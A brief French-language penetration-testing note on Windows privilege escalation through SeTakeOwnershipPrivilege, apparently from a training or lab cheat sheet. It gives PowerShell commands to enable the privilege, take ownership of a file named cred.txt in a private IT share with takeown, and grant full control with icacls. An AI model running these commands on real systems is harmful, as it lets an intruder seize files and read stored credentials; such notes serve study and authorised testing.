# SeTakeOwnershipPrivileges Privesc

## SeTakeOwnershipPrivilege

Ce droit permet de s'attribuer des objets Active Directory, les dossiers/fichiers NTFS, imprimante, clés de registre, services, processus.

Si le droit est "disabled", l'activer:

```powershell
Import-Module .\Enable-Privilege.ps1
```

S'approprier un fichier:

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

S'attribuer les ACL d'un fichier:

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant $user:F
```
